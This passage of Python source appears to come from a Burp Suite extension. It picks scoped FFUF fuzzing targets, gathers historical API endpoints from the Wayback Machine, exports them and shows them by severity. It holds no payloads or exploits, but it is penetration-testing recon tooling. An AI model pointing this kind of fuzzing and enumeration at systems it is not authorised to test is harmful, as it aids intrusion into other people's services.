            if first_part in static_skip_parts or self._ffuf_is_noise_path_segment(first_part):
                dropped_path += 1
                continue

            target = base + "/" + first_part + "/FUZZ"
            api_like = (
                first_part.startswith("api")
                or first_part in ["v1", "v2", "v3", "v4", "graphql", "rest", "svc", "internal"]
                or "/api/" in path.lower()
            )
            priority = 0 if api_like else 1
            prev = candidates.get(target)
            if prev is None or priority < prev:
                candidates[target] = priority

        ordered = sorted(candidates.items(), key=lambda item: (item[1], item[0]))
        total_candidates = len(ordered)
        truncated = 0
        if total_candidates > self.FFUF_MAX_TARGETS:
            truncated = total_candidates - self.FFUF_MAX_TARGETS
            ordered = ordered[: self.FFUF_MAX_TARGETS]
        targets = [target for target, _ in ordered]

        meta = {
            "inspected_entries": inspected_entries,
            "raw_candidates": total_candidates,
            "dropped_noise_host": dropped_noise_host,
            "dropped_scope_host": dropped_scope_host,
            "dropped_path": dropped_path,
            "truncated": truncated,
            "force_host": force_host,
            "selected_host": selected_host,
            "allowed_bases": sorted(list(allowed_bases)),
            "manual_scope_enabled": bool(scope_override.get("enabled")),
            "manual_scope_line_count": len(scope_override.get("lines", [])),
            "manual_scope_host_count": len(scope_override.get("hosts", set())),
            "manual_scope_base_count": len(scope_override.get("bases", set())),
            "manual_scope_preview": list(scope_override.get("lines", []))[:3],
        }
        return targets, meta

    def _run_ffuf(self, event):
        """Run FFUF fuzzer on discovered endpoints"""
        return heavy_runners._run_ffuf(self, event)

    def _collect_wayback_queries(self):
        """Collect scoped Wayback host/path queries from first-party Recon data."""
        static_skip_parts = set(
            [
                "favicon.ico",
                "robots.txt",
                "static",
                "dist",
                "css",
                "js",
                "img",
                "images",
                "fonts",
                "cdn-cgi",
                "captcha",
                "recaptcha",
            ]
        )
        with self.lock:
            entries_snapshot = [self._get_entry(entries) for entries in self.api_data.values()]

        scope_override = self._get_target_scope_override()
        host_counts = {}
        base_scores = {}
        for entry in entries_snapshot:
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                continue
            if scope_override.get("enabled") and not self._host_matches_target_scope(
                host, scope_override
            ):
                continue
            host_counts[host] = host_counts.get(host, 0) + 1
            if (not scope_override.get("enabled")) and self._ffuf_is_noise_host(host):
                continue
            base = self._infer_base_domain(host)
            if not base:
                continue

            score = 1
            method = self._ascii_safe(entry.get("method"), lower=True).strip()
            if method in ["post", "put", "patch", "delete"]:
                score += 2
            path = self._ascii_safe(entry.get("normalized_path") or "/", lower=True)
            if "/api/" in path or "/graphql" in path:
                score += 3
            base_scores[base] = base_scores.get(base, 0) + score

        if scope_override.get("enabled"):
            selected_host = "target-bases"
            force_host = False
            allowed_bases = set(scope_override.get("bases", set()))
        else:
            selected_host = "all"
            try:
                if hasattr(self, "host_filter") and self.host_filter is not None:
                    selected_host = self._ascii_safe(
                        str(self.host_filter.getSelectedItem()), lower=True
                    ).strip()
            except Exception as e:
                self._callbacks.printError("Wayback host-filter read error: {}".format(str(e)))
                selected_host = "all"
            force_host = bool(selected_host and selected_host != "all")

            sorted_bases = sorted(base_scores.items(), key=lambda item: (-item[1], item[0]))
            allowed_bases = set([base for base, _ in sorted_bases[:1]])
            if not allowed_bases:
                fallback_bases = {}
                for host, count in host_counts.items():
                    if self._ffuf_is_noise_host(host):
                        continue
                    base = self._infer_base_domain(host)
                    if not base:
                        continue
                    fallback_bases[base] = fallback_bases.get(base, 0) + count
                fallback_sorted = sorted(
                    fallback_bases.items(), key=lambda item: (-item[1], item[0])
                )
                allowed_bases = set([base for base, _ in fallback_sorted[:1]])

        dropped_noise_host = 0
        dropped_scope_host = 0
        dropped_path = 0
        inspected_entries = 0
        hosts = set()
        path_candidates = {}
        for entry in entries_snapshot:
            inspected_entries += 1
            host = self._ascii_safe(entry.get("host"), lower=True).strip()
            if not host:
                dropped_scope_host += 1
                continue

            if scope_override.get("enabled"):
                if not self._host_matches_target_scope(host, scope_override):
                    dropped_scope_host += 1
                    continue
            elif force_host:
                if host != selected_host:
                    dropped_scope_host += 1
                    continue
            else:
                if self._ffuf_is_noise_host(host):
                    dropped_noise_host += 1
                    continue
                host_base = self._infer_base_domain(host)
                if allowed_bases and host_base not in allowed_bases:
                    dropped_scope_host += 1
                    continue

            hosts.add(host)
            raw_path = self._ascii_safe(
                entry.get("normalized_path") or entry.get("path") or "/",
                lower=True,
            )
            parts = [p for p in raw_path.strip("/").split("/") if p]
            if not parts:
                continue

            first_part = parts[0]
            if first_part in static_skip_parts or self._ffuf_is_noise_path_segment(first_part):
                dropped_path += 1
                continue

            base_path = "/" + first_part
            score = 1
            if first_part.startswith("api") or first_part in [
                "v1",
                "v2",
                "v3",
                "v4",
                "graphql",
                "rest",
                "auth",
                "oauth",
                "internal",
            ]:
                score += 3
            key = (host, base_path)
            previous = path_candidates.get(key)
            if previous is None or score > previous:
                path_candidates[key] = score

            if first_part == "api" and len(parts) > 1:
                second_part = self._ascii_safe(parts[1], lower=True).strip()
                if (
                    second_part
                    and second_part not in static_skip_parts
                    and not self._ffuf_is_noise_path_segment(second_part)
                ):
                    key2 = (host, "/api/" + second_part)
                    score2 = score + 1
                    previous2 = path_candidates.get(key2)
                    if previous2 is None or score2 > previous2:
                        path_candidates[key2] = score2

        host_queries = [(host, "") for host in sorted(hosts)]
        ranked_paths = sorted(
            path_candidates.items(),
            key=lambda item: (-item[1], item[0][0], item[0][1]),
        )
        path_queries = [item[0] for item in ranked_paths]
        queries = host_queries + path_queries
        raw_queries = len(queries)
        truncated = 0
        if raw_queries > self.WAYBACK_MAX_QUERIES:
            truncated = raw_queries - self.WAYBACK_MAX_QUERIES
            queries = queries[: self.WAYBACK_MAX_QUERIES]

        meta = {
            "inspected_entries": inspected_entries,
            "host_count": len(hosts),
            "path_count": len(path_candidates),
            "raw_queries": raw_queries,
            "dropped_noise_host": dropped_noise_host,
            "dropped_scope_host": dropped_scope_host,
            "dropped_path": dropped_path,
            "truncated": truncated,
            "force_host": force_host,
            "selected_host": selected_host,
            "allowed_bases": sorted(list(allowed_bases)),
            "manual_scope_enabled": bool(scope_override.get("enabled")),
            "manual_scope_line_count": len(scope_override.get("lines", [])),
            "manual_scope_host_count": len(scope_override.get("hosts", set())),
            "manual_scope_base_count": len(scope_override.get("bases", set())),
            "manual_scope_preview": list(scope_override.get("lines", []))[:3],
        }
        return queries, meta

    def _run_wayback(self):
        """Discover historical endpoints using Wayback Machine API"""
        return heavy_runners._run_wayback(self)

    def _export_wayback_results(self):
        """Export Wayback discovered snapshots to JSON, TXT, and endpoints list"""
        import os

        with self.wayback_lock:
            data = list(self.wayback_discovered)

        if not data:
            self.wayback_area.append("\n[!] No snapshots to export\n")
            return

        export_dir = self._get_export_dir("Wayback_Export")
        if not export_dir:
            return

        json_file = os.path.join(export_dir, "wayback_results.json")
        txt_file = os.path.join(export_dir, "wayback_urls.txt")
        endpoints_file = os.path.join(export_dir, "discovered_endpoints.txt")

        # Parse and structure data
        structured = []
        unique_endpoints = set()
        for entry in data:
            parts = entry.split(" | ")
            if len(parts) >= 3:
                original_url = parts[0]
                structured.append({
                    "original_url": original_url,
                    "archive_url": parts[1],
                    "timestamp": parts[2],
                    "score": self._score_wayback_url(original_url)
                })
                # Extract unique endpoint
                try:
                    if not original_url.startswith("http"):
                        original_url = "http://" + original_url
                    parsed = URL(original_url)
                    endpoint = "{}://{}{}".format(parsed.getProtocol(), parsed.getHost(), parsed.getPath() or "/")
                    if parsed.getQuery():
                        endpoint += "?" + parsed.getQuery()
                    unique_endpoints.add(endpoint)
                except Exception as e:
                    self._callbacks.printError(
                        "Wayback export endpoint parse error: {}".format(str(e))
                    )

        structured.sort(key=lambda x: x["score"], reverse=True)

        export_data = {
            "metadata": {
                "total_snapshots": len(structured),
                "unique_endpoints": len(unique_endpoints),
                "api_endpoints": sum(1 for s in structured if s["score"] >= 10),
                "export_time": SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date())
            },
            "snapshots": structured,
            "unique_endpoints": sorted(unique_endpoints)
        }

        writer = None
        try:
            writer = FileWriter(json_file)
            writer.write(json.dumps(export_data, indent=2))
            writer.close()

            writer = FileWriter(txt_file)
            for item in structured:
                writer.write(item["original_url"] + "\n")
            writer.close()

            writer = FileWriter(endpoints_file)
            filtered_endpoints = []
            for endpoint in sorted(unique_endpoints):
                ep_lower = endpoint.lower()
                # Filter useful API endpoints only
                if any(pattern in ep_lower for pattern in ['/api/', '/v1/', '/v2/', '/v3/', '/graphql', '/rest/']):
                    # Skip noise
                    if not any(noise in ep_lower for noise in ['?q=', '?rdt=', '/r/$', 'search', 'query']):
                        filtered_endpoints.append(endpoint)
                        writer.write(endpoint + "\n")
            writer.close()
            
            # Update metadata
            export_data["metadata"]["filtered_endpoints"] = len(filtered_endpoints)

            filtered_count = export_data["metadata"].get("filtered_endpoints", 0)
            self.wayback_area.append("\n[+] Exported {} snapshots\n".format(len(data)))
            self.wayback_area.append("[+] Unique Endpoints: {}\n".format(len(unique_endpoints)))
            self.wayback_area.append("[+] Filtered API Endpoints: {}\n".format(filtered_count))
            self.wayback_area.append("[+] JSON: {}\n".format(json_file))
            self.wayback_area.append("[+] URLs: {}\n".format(txt_file))
            self.wayback_area.append("[+] Endpoints: {}\n".format(endpoints_file))
            self.wayback_area.append("[+] Folder: {}\n".format(export_dir))
            self.log_to_ui("[+] Wayback export: {} endpoints".format(len(unique_endpoints)))
        except Exception as e:
            self.wayback_area.append("\n[!] Export failed: {}\n".format(str(e)))
        finally:
            if writer:
                try:
                    writer.close()
                except Exception as close_err:
                    self._callbacks.printError(
                        "Error closing wayback export file: {}".format(str(close_err))
                    )

    def _score_wayback_url(self, url):
        """Score URL by relevance for prioritization"""
        score = 0
        url_lower = url.lower()
        if '/api/' in url_lower:
            score += 10
        if any(v in url_lower for v in ['/v1/', '/v2/', '/v3/']):
            score += 5
        if any(ext in url_lower for ext in ['.js', '.css', '.png', '.jpg']):
            score -= 5
        return score

    def _import_wayback_to_recon(self):
        """Send Wayback snapshots to Recon tab"""
        with self.wayback_lock:
            snapshots = list(self.wayback_discovered)
        if not snapshots:
            self.wayback_area.append(
                "\n[!] No snapshots discovered. Run discovery first\n"
            )
            return

        self.wayback_area.append("\n[*] Sending snapshots to Recon tab...\n")
        imported = 0
        skipped = 0
        for snapshot in snapshots:
            try:
                parts = snapshot.split(" | ")
                if len(parts) < 1:
                    continue
                original_url = parts[0]

                # Ensure URL has protocol
                if not original_url.startswith(
                    "http://"
                ) and not original_url.startswith("https://"):
                    original_url = "http://" + original_url

                parsed = URL(original_url)
                method = "GET"
                path = parsed.getPath() or "/"
                normalized = self._normalize_path(path)
                key = "{}:{}".format(method, normalized)

                with self.lock:
                    if key not in self.api_data:
                        protocol = parsed.getProtocol() or "http"
                        port = parsed.getPort()
                        if port == -1:
                            port = 443 if protocol == "https" else 80

                        entry = {
                            "method": method,
                            "path": path,
                            "normalized_path": normalized,
                            "host": parsed.getHost(),
                            "protocol": protocol,
                            "port": port,
                            "query_string": parsed.getQuery() or "",
                            "parameters": {
                                "url": {},
                                "body": {},
                                "cookie": {},
                                "json": {},
                            },
                            "headers": {},
                            "request_body": "",
                            "response_status": 200,
                            "response_headers": {},
                            "response_body": "",
                            "response_length": 0,
                            "response_time_ms": 0,
                            "content_type": "unknown",
                            "auth_detected": ["None"],
                            "api_patterns": ["Wayback"],
                            "jwt_detected": None,
                            "encryption_indicators": {
                                "likely_encrypted": False,
                                "types": [],
                            },
                            "param_patterns": {"reflected": [], "param_types": {}},
                        }
                        self.api_data[key] = [entry]
                        self.endpoint_tags[key] = ["wayback", "historical"]
                        self.endpoint_times[key] = [0]
                        imported += 1
                    else:
                        skipped += 1
            except Exception as e:
                self._callbacks.printError(
                    "Error importing Wayback URL: {}".format(str(e))
                )

        summary = "\n" + "=" * 60 + "\n"
        summary += "IMPORT COMPLETE\n"
        summary += "=" * 60 + "\n"
        summary += "[+] New Endpoints: {}\n".format(imported)
        summary += "[+] Skipped (duplicates): {}\n".format(skipped)
        summary += "[+] Total Processed: {}\n".format(len(snapshots))
        summary += "=" * 60 + "\n"

        self.wayback_area.append(summary)
        self.log_to_ui("[+] Wayback: {} new, {} skipped".format(imported, skipped))
        SwingUtilities.invokeLater(
            lambda: self.endpoint_list.getCellRenderer().invalidate_cache()
        )
        SwingUtilities.invokeLater(lambda: self._update_host_filter())
        SwingUtilities.invokeLater(lambda: self._update_stats())
        SwingUtilities.invokeLater(lambda: self.refresh_view())

    def log_to_ui(self, message):
        timestamp = SimpleDateFormat("HH:mm:ss").format(Date())
        timestamped = "[{}] {}".format(timestamp, message)
        self._callbacks.printOutput(timestamped)
        SwingUtilities.invokeLater(lambda: self._append_log(timestamped))

    def _append_log(self, message):
        self.log_area.append(message + "\n")
        self.log_area.setCaretPosition(self.log_area.getDocument().getLength())


class EndpointClickListener(MouseAdapter):
    def __init__(self, extender):
        self.extender = extender

    @staticmethod
    def _extract_endpoint_key(value):
        if "x]" in value and not value.startswith("==="):
            parts = value.split("] ", 1)
            if len(parts) > 1:
                return parts[1].split(" @ ")[0]
        return None

    def mouseClicked(self, event):
        if event.getClickCount() == 2:
            list = event.getSource()
            index = list.locationToIndex(event.getPoint())
            if index >= 0:
                value = str(list.getModel().getElementAt(index))
                endpoint_key = self._extract_endpoint_key(value)
                if endpoint_key:
                    self.extender.show_endpoint_details(endpoint_key)

    def mousePressed(self, event):
        self._show_popup(event)

    def mouseReleased(self, event):
        self._show_popup(event)

    def _show_popup(self, event):
        if event.isPopupTrigger():
            list = event.getSource()
            index = list.locationToIndex(event.getPoint())
            if index >= 0:
                list.setSelectedIndex(index)
                value = str(list.getModel().getElementAt(index))
                endpoint_key = self._extract_endpoint_key(value)
                if endpoint_key:
                    popup = JPopupMenu()
                    repeater_item = JMenuItem("Send to Repeater")
                    repeater_item.addActionListener(
                        lambda e: self.extender._send_endpoint_to_repeater(endpoint_key)
                    )
                    popup.add(repeater_item)
                    popup.show(event.getComponent(), event.getX(), event.getY())


class EndpointSelectionListener(ListSelectionListener):
    def __init__(self, extender):
        self.extender = extender

    def valueChanged(self, event):
        if not event.getValueIsAdjusting():
            list = event.getSource()
            index = list.getSelectedIndex()
            if index >= 0:
                value = str(list.getModel().getElementAt(index))
                endpoint_key = EndpointClickListener._extract_endpoint_key(value)
                if endpoint_key:
                    self.extender.show_endpoint_details(endpoint_key)


class EndpointRenderer(ListCellRenderer):
    def __init__(self, extender):
        self.extender = extender
        self.severity_cache = {}

    def invalidate_cache(self):
        self.severity_cache.clear()

    def getListCellRendererComponent(
        self, list, value, index, isSelected, cellHasFocus
    ):
        panel = JPanel()
        panel.setLayout(BoxLayout(panel, BoxLayout.X_AXIS))
        panel.setOpaque(True)

        text_label = JLabel(str(value))
        text_label.setFont(Font("Monospaced", Font.PLAIN, 12))
        panel.add(text_label)
        panel.add(Box.createHorizontalGlue())

        # Extract endpoint key from display text
        endpoint_key = EndpointClickListener._extract_endpoint_key(str(value))

        # Determine severity using cache to avoid lock on every render
        severity = None
        if endpoint_key:
            severity = self.severity_cache.get(endpoint_key)
            if severity is None:
                with self.extender.lock:
                    if endpoint_key in self.extender.api_data:
                        entries = self.extender.api_data[endpoint_key]
                        severity = self.extender._get_severity(endpoint_key, entries)
                        self.severity_cache[endpoint_key] = severity

        if severity:

            severity_label = JLabel()
            severity_label.setFont(Font("Monospaced", Font.BOLD, 11))

            if severity == "critical":
                panel.setBackground(
                    Color(220, 53, 69) if not isSelected else Color(180, 43, 59)
                )
                text_label.setForeground(Color.WHITE)
                severity_label.setText("[CRITICAL]")
                severity_label.setForeground(Color.WHITE)
            elif severity == "high":
                panel.setBackground(
                    Color(255, 193, 7) if not isSelected else Color(215, 163, 0)
                )
                text_label.setForeground(Color.BLACK)
                severity_label.setText("[HIGH]")
                severity_label.setForeground(Color(139, 0, 0))
            elif severity == "medium":
                panel.setBackground(
                    Color(255, 235, 170) if not isSelected else Color(215, 195, 130)
                )
                text_label.setForeground(Color.BLACK)
                severity_label.setText("[MEDIUM]")
                severity_label.setForeground(Color(139, 69, 0))
            else:
                if isSelected:
                    panel.setBackground(Color(220, 220, 220))
                elif index % 2 == 0:
                    panel.setBackground(Color.WHITE)
                else:
                    panel.setBackground(Color(245, 245, 245))
                text_label.setForeground(Color.BLACK)

            if severity in ["critical", "high", "medium"]:
                panel.add(severity_label)
        else:
            # Group headers or non-endpoint lines
            if isSelected:
                panel.setBackground(Color(220, 220, 220))
            elif index % 2 == 0:
                panel.setBackground(Color.WHITE)
            else:
                panel.setBackground(Color(245, 245, 245))
            text_label.setForeground(Color.BLACK)

        return panel
